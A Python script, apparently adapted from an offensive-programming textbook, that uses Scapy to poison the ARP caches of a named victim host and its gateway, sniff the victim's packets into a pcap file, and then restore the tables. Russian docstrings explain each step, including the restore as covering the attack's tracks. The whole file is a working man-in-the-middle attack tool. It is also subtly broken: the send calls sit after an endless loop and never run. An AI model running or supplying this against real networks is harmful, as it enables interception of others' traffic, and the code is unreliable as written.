from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)
import os
import sys
import time


def get_mac(targetip):
    """передаем IP-адрес и создаем пакет. Функция Ether делает так, что этот пакет будет передаваться по
     широковещательному каналу, а функция ARP определяет запрос, который, будучи послан по заданному MAC-адресу,
     спрашивает у каждого сетевого узла о наличии IP-адреса жертвы. Пакет отправляется с помощью функции srp из состава
     Scapy, которая передает и принимает пакеты на втором, канальном уровне.
      переменная resp должна будет содержать источник уровня Ether (MAC-адрес) для IP-адреса жертвы."""
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op='who-has', pdst=targetip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None


class Arper:
    """При инициализации этого класса мы указываем IP-адреса жертвы и шлюза, а также сетевой интерфейс, который будет
    использоваться (en0 по умолчанию). Имея эту информацию, инициализируем переменные interface, victim, victimmac,
    gateway и gatewaymac, выводя значения в консоль"""
    def __init__(self, victim, gateway, interface='en0'):
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self. gatewaymac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0

        print(f'Initialized {interface}:')
        print(f'Gateway ({gateway}) is at {self.gatewaymac}.')
        print(f'Victim ({victim}) is a {self.victimmac}.')
        print('-' * 30)

    def run(self):
        """метод run подготавливает и выполняет два процесса: один для подмены ARP-кэша, а другой для того, чтобы
        мы могли наблюдать за проведением атаки путем анализа сетевого трафика."""
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self):
        """Метод poison создает модифицированные пакеты и отправляет их жертве и шлюзу, подготавливает данные, которые
         мы будем использовать в ходе атаки ARP-спуфинга на жертву и шлюз. Сначала создается модифицированный ARP-пакет,
         предназначенный для жертвы. Аналогично создается ARP-пакет для шлюза. Чтобы атаковать шлюз, мы шлем ему
         API-адрес жертвы и собственный MAC-адрес. Таким же образом атакуем жертву, отправляя ей свой MAC-адрес вместе
         с IP-адресом шлюза. Мы выводим всю эту информацию в консоль, чтобы убедиться в корректности адресов назначения
         и содержимого наших пакетов.

         Вслед за этим запускаем бесконечный цикл и начинаем слать модифицированные пакеты тем, кому они предназначены,
         чтобы соответствующие записи в ARP-кэше оставались видоизмененными на протяжении всей атаки. Цикл будет
         продолжаться, пока вы не нажмете Ctrl+C (KeyboardInterrupt), после чего нормальные параметры будут
         восстановлены (для этого мы отправим жертве и шлюзу корректную информацию, заметая следы атаки)."""
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac

        print(f'ip src: {poison_victim.psrc}')
        print(f'ip dst: {poison_victim.pdst}')
        print(f'mac dst: {poison_victim.hwdst}')
        print(f'mac src: {poison_victim.hwsrc}')
        print(poison_victim.summary())
        print('_' * 30)
        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac

        print(f'ip src: {poison_gateway.psrc}')
        print(f'ip dst: {poison_gateway.pdst}')
        print(f'mac dst: {poison_gateway.hwdst}')
        print(f'mac_src: {poison_gateway.hwsrc}')
        print(poison_gateway.summary())
        print('-' * 30)
        print(f'Beginning the ARP poison. [CTRL-C to stop]')
        while True:
            sys.stdout.write('..')
            sys.stdout.flush()
        try:
            send(poison_victim)
            send(poison_gateway)
        except KeyboardInterrupt:
            self.restore()
            sys.exit()
        else:
            time.sleep(2)

    def sniff(self, count=100):
        """Прежде чем начинать анализ, метод sniff ждет 5 секунд, чтобы поток, занимающийся спуфингом, успел начать
           работу. Мы берем заданное количество пакетов (100 по умолчанию) и отбираем те, которые содержат IP адрес
           жертвы. Получив нужные пакеты, записываем их в файл с именем arper.pcap, восстанавливаем исходные значения в
           ARP-таблицах и завершаем работу потока poison_thread."""
        time.sleep(5)
        print(f'Sniffing {count} packets')
        bpf_filter = 'ip host %s' % victim
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        wrpcap('arper.pcap', packets)
        print('Got the packets')
        self.restore()
        self.poison_thread.terminate()
        print('Finished.')

    def restore(self):
        """Метод restore может вызываться как из poison (если нажать Ctrl+C), так и из sniff (после захвата заданного
        количества пакетов). Он шлет жертве исходные значения IP- и MAC-адресов шлюза, а шлюзу — исходные значения
        IP- и MAC-адресов жертвы """
        print('Restoring ARP tables...')
        send(ARP(op=2, psrc=self.gateway, hwsrc=self.gatewaymac, pdst=self.victim, hwdst='ff:ff:ff:ff:ff:ff'), count=5)
        send(ARP(op=2, psrc=self.victim, hwsrc=self.victimmac, pdst=self.gateway, hwdst='ff:ff:ff:ff:ff:ff'), count=5)


if __name__ == '__main__':
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    myarp = Arper(victim, gateway, interface)
    myarp.run()